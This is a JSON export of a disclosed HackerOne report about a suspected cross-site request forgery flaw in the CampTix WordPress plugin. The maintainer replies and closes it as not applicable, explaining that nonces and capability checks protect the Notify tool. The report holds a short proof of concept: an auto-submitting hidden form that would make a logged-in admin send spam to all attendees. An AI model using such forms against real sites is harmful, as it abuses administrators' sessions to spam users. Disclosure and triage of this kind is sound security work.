{"id":159925,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk5MjU=","url":"https://hackerone.com/reports/159925","title":"Send emails to all users using Camptix","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2016-08-17T03:57:01.296Z","submitted_at":"2016-08-17T03:57:01.296Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jshindl","url":"/jshindl","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":162,"url":"https://hackerone.com/iandunn-projects","handle":"iandunn-projects","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ian Dunn","twitter_handle":"","website":"","about":"I'm a WordPress developer who maintains several small open source projects."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-09-27T21:45:12.247Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-08-24T18:46:45.048Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Ian,\nThis is my first stab at submitting a bug, and I'm not even sure it is one. Here's what I found.\n\nIf an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.\n\nPOC: \n\u003cbody onload=\"document.getElementById('s').submit();\"\u003e\n\u003cform method=post id=s action=\"http://xxx/wp-admin/edit.php?post_type=tix_ticket\u0026page=camptix_tools\u0026tix_summarize=1\u0026tix_section=notify\u0026tix_notify_attendees=1\"\u003e\n\t\u003cinput type=hidden name=\"tix-notify-segment-query\" value='[{\"field\":\"ticket\",\"op\":\"is not\",\"value\":\"1\"}]'\u003e\n\t\u003cinput type=hidden name=\"tix-notify-segment-match\" value=\"OR\"\u003e\n\u003cinput type=hidden name=\"tix_notify_subject\" value=\"camptix likes viagara\"\u003e\n\u003cinput type=hidden name=\"tix_notify_body\" value=\"send scary messages about viagra\"\u003e\n\u003cinput type=hidden name=\"tix_notify_attendees\" value=\"1\"\u003e\n\u003cinput type=hidden name=\"tix_notify_submit \" value=\"Send E-mails\"\u003e\n\u003cinput type=hidden name=\"_wpnonce\" value=\"122536321b\"\u003e\n\u003cinput type=hidden name=\"_wp_http_referer\" value=\"/wp-admin/edit.php?post_type=tix_ticket\u0026page=camptix_tools\u0026tix_summarize=1\u0026tix_section=notify\u0026tix_notify_attendees=1\"\u003e\n\t\u003cinput type=submit \u003e\t\n\u003c/form\u003e\n\u003c/body\u003e\n\nI'm not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn't rely on it for security, and this article claims they can be generated easily.\nhttps://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/\n\nThe POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.\n\nI'm eager to hear back, and I'm eager to hear how I could make this report more helpful. :)\nJason\n\n","vulnerability_information_html":"\u003cp\u003eIan,\u003cbr\u003e\nThis is my first stab at submitting a bug, and I\u0026#39;m not even sure it is one. Here\u0026#39;s what I found.\u003c/p\u003e\n\n\u003cp\u003eIf an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.\u003c/p\u003e\n\n\u003cp\u003ePOC: \u003cbr\u003e\n\u0026lt;body onload=\u0026quot;document.getElementById(\u0026#39;s\u0026#39;).submit();\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;form method=post id=s action=\u0026quot;http://xxx/wp-admin/edit.php?post_type=tix_ticket\u0026amp;page=camptix_tools\u0026amp;tix_summarize=1\u0026amp;tix_section=notify\u0026amp;tix_notify_attendees=1\u0026quot;\u0026gt;\u003cbr\u003e\n    \u0026lt;input type=hidden name=\u0026quot;tix-notify-segment-query\u0026quot; value=\u0026#39;[{\u0026quot;field\u0026quot;:\u0026quot;ticket\u0026quot;,\u0026quot;op\u0026quot;:\u0026quot;is not\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;1\u0026quot;}]\u0026#39;\u0026gt;\u003cbr\u003e\n    \u0026lt;input type=hidden name=\u0026quot;tix-notify-segment-match\u0026quot; value=\u0026quot;OR\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;tix_notify_subject\u0026quot; value=\u0026quot;camptix likes viagara\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;tix_notify_body\u0026quot; value=\u0026quot;send scary messages about viagra\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;tix_notify_attendees\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;tix_notify_submit \u0026quot; value=\u0026quot;Send E-mails\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;_wpnonce\u0026quot; value=\u0026quot;122536321b\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=hidden name=\u0026quot;_wp_http_referer\u0026quot; value=\u0026quot;/wp-admin/edit.php?post_type=tix_ticket\u0026amp;page=camptix_tools\u0026amp;tix_summarize=1\u0026amp;tix_section=notify\u0026amp;tix_notify_attendees=1\u0026quot;\u0026gt;\u003cbr\u003e\n    \u0026lt;input type=submit \u0026gt;\u003cbr\u003e\u003cbr\u003e\n\u0026lt;/form\u0026gt;\u003cbr\u003e\n\u0026lt;/body\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn\u0026#39;t rely on it for security, and this article claims they can be generated easily.\u003cbr\u003e\n\u003ca title=\"https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/\" href=\"/redirect?url=https%3A%2F%2Fcodeseekah.com%2F2016%2F01%2F21%2Fwordpress-nonces-vulnerabilities%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m eager to hear back, and I\u0026#39;m eager to hear how I could make this report more helpful. :)\u003cbr\u003e\nJason\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["dyabla","khokho1986"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1132074,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jason, thanks for the report. It gave me all the info I need to dig into this, so it was very helpful :)\n\nAt first glance, this doesn't seem like it'd be exploitable in a real-world scenario. I'm going to dig into it more to check if I'm right about that, though. I'll let you know what I find out later today.","markdown_message":"\u003cp\u003eHi Jason, thanks for the report. It gave me all the info I need to dig into this, so it was very helpful :)\u003c/p\u003e\n\n\u003cp\u003eAt first glance, this doesn\u0026#39;t seem like it\u0026#39;d be exploitable in a real-world scenario. I\u0026#39;m going to dig into it more to check if I\u0026#39;m right about that, though. I\u0026#39;ll let you know what I find out later today.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T15:18:55.258Z","updated_at":"2016-08-17T15:18:55.258Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1132076,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-17T15:19:46.237Z","updated_at":"2018-02-28T13:10:44.752Z","additional_data":{"added_weaknesses":[{"id":45,"name":"Cross-Site Request Forgery (CSRF)"}],"removed_weaknesses":[{"id":57,"name":"Violation of Secure Design Principles"}]},"actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1132096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As far as I can tell, you need to trick an admin who is already logged into wordpress into visiting a malicious website, which has access to a wpnonce value (which from that link, is doable). I agree, it is remote -- but a determined hacker could do it. :)","markdown_message":"\u003cp\u003eAs far as I can tell, you need to trick an admin who is already logged into wordpress into visiting a malicious website, which has access to a wpnonce value (which from that link, is doable). I agree, it is remote -- but a determined hacker could do it. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T15:26:19.174Z","updated_at":"2016-08-17T15:26:19.174Z","actor":{"username":"jshindl","cleared":false,"url":"/jshindl","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1133289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Jason, it doesn't look like I'll be able to dig into this any more today like I had planned, but I should be able to tomorrow. I'll keep you updated.","markdown_message":"\u003cp\u003eHey Jason, it doesn\u0026#39;t look like I\u0026#39;ll be able to dig into this any more today like I had planned, but I should be able to tomorrow. I\u0026#39;ll keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T23:40:43.456Z","updated_at":"2016-08-17T23:40:43.456Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1139261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jason, I looked deeper into this and it doesn't look like there's any vulnerability here.\n\nThe article you mentioned describes a situation where the following conditions apply:\n\n1. The code was being executed for unauthenticated visitors\n1. The code is relying on nonces for authorization instead of using `current_user_can()`\n1. The site is either a) Running WP 3.3.x or older and hasn't defined custom `NONCE_SALT`/`NONCE_KEY` values; or b) Has their web server incorrectly configured such that their `wp-config.php` file does not get parsed by the PHP engine and can be read plain-text by making an HTTP request to its URL\n\nThe situation with CampTix is very different, though.\n\n1. The Notify tool can only be used by authenticated users who have administrative privileges. This means that `$token` will be a CSPRN.\n1. CampTix is using nonces properly. They're used to verify *intention* (i.e., to protect against CSRF), not to verify *authorization* (which is the job of `current_user_can()`). \n\nThe crux of the vulnerability that the article described is that 3rd piece, though. That's not something CampTix has any control over; it depends entirely on how the individual site has configured their web server and their `wp-config.php` file, and whether or not they're running a very old version of WordPress. \n\nPersonally, I think that those conditions are much more uncommon than the article's author claims, and I'm confident that they're extremely rare in professionally-run sites. Further, if you could read `wp-config.php`, you could do far worse things than CSRF in CampTix, like creating a new admin user in the database, read hashed passwords from the db and easily crack them, use CSRF to add a new admin user, etc.\n\nI think if there is an exploit here, it wouldn't just be a vulnerability in CampTix, it would be a vulnerability in WordPress Core, and every plugin that uses nonces in the way they're meant to be used.\n\nI'm happy to be proven wrong, though. If you can generate a correct nonce for the Notify action on https://testing.wordcamp.org then I'll definitely accept this (even if don't perform the social engineering component).\n\nOtherwise, I think this can be closed as `Not applicable`.","markdown_message":"\u003cp\u003eHi Jason, I looked deeper into this and it doesn\u0026#39;t look like there\u0026#39;s any vulnerability here.\u003c/p\u003e\n\n\u003cp\u003eThe article you mentioned describes a situation where the following conditions apply:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe code was being executed for unauthenticated visitors\u003c/li\u003e\n\u003cli\u003eThe code is relying on nonces for authorization instead of using \u003ccode\u003ecurrent_user_can()\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eThe site is either a) Running WP 3.3.x or older and hasn\u0026#39;t defined custom \u003ccode\u003eNONCE_SALT\u003c/code\u003e/\u003ccode\u003eNONCE_KEY\u003c/code\u003e values; or b) Has their web server incorrectly configured such that their \u003ccode\u003ewp-config.php\u003c/code\u003e file does not get parsed by the PHP engine and can be read plain-text by making an HTTP request to its URL\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe situation with CampTix is very different, though.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe Notify tool can only be used by authenticated users who have administrative privileges. This means that \u003ccode\u003e$token\u003c/code\u003e will be a CSPRN.\u003c/li\u003e\n\u003cli\u003eCampTix is using nonces properly. They\u0026#39;re used to verify \u003cem\u003eintention\u003c/em\u003e (i.e., to protect against CSRF), not to verify \u003cem\u003eauthorization\u003c/em\u003e (which is the job of \u003ccode\u003ecurrent_user_can()\u003c/code\u003e). \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe crux of the vulnerability that the article described is that 3rd piece, though. That\u0026#39;s not something CampTix has any control over; it depends entirely on how the individual site has configured their web server and their \u003ccode\u003ewp-config.php\u003c/code\u003e file, and whether or not they\u0026#39;re running a very old version of WordPress. \u003c/p\u003e\n\n\u003cp\u003ePersonally, I think that those conditions are much more uncommon than the article\u0026#39;s author claims, and I\u0026#39;m confident that they\u0026#39;re extremely rare in professionally-run sites. Further, if you could read \u003ccode\u003ewp-config.php\u003c/code\u003e, you could do far worse things than CSRF in CampTix, like creating a new admin user in the database, read hashed passwords from the db and easily crack them, use CSRF to add a new admin user, etc.\u003c/p\u003e\n\n\u003cp\u003eI think if there is an exploit here, it wouldn\u0026#39;t just be a vulnerability in CampTix, it would be a vulnerability in WordPress Core, and every plugin that uses nonces in the way they\u0026#39;re meant to be used.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m happy to be proven wrong, though. If you can generate a correct nonce for the Notify action on \u003ca title=\"https://testing.wordcamp.org\" href=\"/redirect?url=https%3A%2F%2Ftesting.wordcamp.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://testing.wordcamp.org\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e then I\u0026#39;ll definitely accept this (even if don\u0026#39;t perform the social engineering component).\u003c/p\u003e\n\n\u003cp\u003eOtherwise, I think this can be closed as \u003ccode\u003eNot applicable\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-19T01:29:33.353Z","updated_at":"2016-08-19T01:29:33.353Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1152362,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"I'm gonna go ahead and close this since you haven't responded, but if you think there's still a vulnerability please let me know and I can re-open it.","markdown_message":"\u003cp\u003eI\u0026#39;m gonna go ahead and close this since you haven\u0026#39;t responded, but if you think there\u0026#39;s still a vulnerability please let me know and I can re-open it.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-24T18:46:29.224Z","updated_at":"2016-08-24T18:46:29.224Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1152363,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-24T18:46:45.082Z","updated_at":"2016-08-24T18:46:45.082Z","first_to_agree":true,"actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1220157,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-27T21:45:12.184Z","updated_at":"2016-09-27T21:45:12.184Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}